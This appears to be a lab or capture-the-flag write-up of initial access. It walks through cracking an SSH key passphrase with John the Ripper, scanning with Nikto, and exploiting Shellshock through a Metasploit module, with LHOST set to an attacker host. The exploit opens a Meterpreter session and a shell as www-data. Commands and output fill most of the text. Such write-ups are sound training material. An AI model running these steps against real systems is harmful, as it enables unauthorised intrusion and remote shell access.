# ⚔️ Initial Access

## Investigating the RSA Key

### What was done?

The encrypted private key was converted into a format suitable for John the Ripper.

```bash
┌──(kali㉿kali)-[~/lab]
└─$ ssh2john id_rsa > hash.txt
```

Then cracked using RockYou.

```bash
┌──(kali㉿kali)-[~/lab]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Result

```text
id_rsa:letmein
```

### What happened?

Although the passphrase was recovered successfully, authentication attempts still failed.

This was a dead end.

---

## Vulnerability Assessment

To identify alternative attack vectors, I scanned the web application using Nikto.

```bash
┌──(kali㉿kali)-[~/lab]
└─$ nikto -h 10.49.181.37 -C all
```

Nikto revealed a potentially interesting CGI attack surface.

The presence of:

```text
/cgi-bin/
```

combined with the server age made Shellshock worth investigating.

---

## Exploiting Shellshock

### Why?

Shellshock (CVE-2014-6271) affects vulnerable Bash implementations and can allow remote command execution through CGI scripts.

The machine contained:

```text
/cgi-bin/test.cgi
```

which appeared ideal for testing.

---

### Metasploit Configuration

```bash
msfconsole
```

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Configuration:

```text
RHOSTS = 10.49.181.37
TARGETURI = /cgi-bin/test.cgi
LHOST = attacker
```

---

### Exploitation

```bash
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
```

### Result

```text
Meterpreter session opened
```

After upgrading the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

I confirmed access:

```bash
uid=33(www-data)
```

